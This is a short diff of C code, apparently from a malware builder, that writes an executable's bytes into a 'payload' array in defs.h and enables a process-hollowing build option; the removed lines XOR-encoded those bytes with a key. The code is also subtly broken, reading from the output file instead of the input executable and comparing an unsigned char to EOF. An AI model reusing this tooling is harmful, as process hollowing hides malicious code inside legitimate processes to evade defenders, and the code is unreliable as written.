@@ -182,27 +182,37 @@ int main (int argc, char **argv)
 	// Process Hollowing
 	if(Hvalue)
 	{
-		// Read executable from Hvalue file and write the data into defs.h
 		printf("Write executable from %s to defs.h\n", Hvalue);
 		
-		FILE *file_exe = fopen(Hvalue, "rb");
-		FILE *file_def = fopen("defs.h", "wb");
+		FILE *file_exe = fopen(Hvalue, "r");
+		FILE *file_def = fopen("defs.h", "a");
 		
-		fprintf(file_def, "\n unsigned char payload[] = {");
 		unsigned char currentByte = 0;
+		long currentSize = 0;
+	
+		// Read data from excutable file and write bytewise into array "payload" in defs.h
+		fprintf(file_def, "\n unsigned char payload[] = {");
+		
 		for(int i = 0;;i++) 
 		{
 			if ((currentByte = fgetc(file_def)) == EOF) break;			
-			if (i != 0) printf(",");
-			if ((i % 12) == 0) printf("\n\t");
-			// XOR the byte with the generated key before writing it into the array
-			currentPayloadByte = currentPayloadByte ^ keys[payloadCounter];
-			printf("0x%.2X", (unsigned char) currentPayloadByte);
-			currentPayloadSize++;
+			if (i != 0) fprintf(file_def, ",");
+			if ((i % 12) == 0) fprintf(file_def, "\n\t");
+			fprintf(file_def, "0x%.2X", (unsigned char) currentByte);
+			currentSize++;
 		}
 		
+		fprintf(file_def, "};");
 		
+		// Write payload size in bytes into defs.h
+		fprintf(file_def, "\nlong payloadSize = %ld;\n", currentSize);
+				
 		// Set define
+		fprintf(file_def, "\n#define PROCESS_HOLLOWING\n");
+		
+		// Close file handles
+		fclose(file_def);
+		fclose(file_exe);
 	}
 
 	//Image name
